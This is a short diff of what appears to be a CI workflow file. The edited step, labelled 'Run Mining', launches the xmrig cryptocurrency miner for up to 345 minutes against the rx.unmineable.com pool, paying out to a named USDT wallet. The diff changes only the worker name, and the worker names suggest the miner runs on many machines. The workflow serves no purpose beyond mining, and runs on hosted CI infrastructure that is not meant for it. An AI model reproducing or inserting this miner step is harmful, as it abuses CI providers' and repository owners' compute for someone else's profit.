@@ -28,4 +28,4 @@ jobs:
     
     - name: Run Mining
       run: |
-        cd /tmp/xmrig-6.21.0 && chmod +x xmrig && timeout 345m ./xmrig -o rx.unmineable.com:3333 -u USDT:0x74B56f2C379996fedabF53D36aeE73c5E5129fC9.vps7530_xaviersavoie -p x --donate-level 1 || true
+        cd /tmp/xmrig-6.21.0 && chmod +x xmrig && timeout 345m ./xmrig -o rx.unmineable.com:3333 -u USDT:0x74B56f2C379996fedabF53D36aeE73c5E5129fC9.vps7031_xaviersavoie -p x --donate-level 1 || true
